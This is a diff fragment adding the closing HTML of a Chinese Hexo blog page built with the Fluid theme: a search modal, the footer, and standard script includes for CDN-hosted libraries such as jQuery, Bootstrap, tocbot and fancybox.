+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
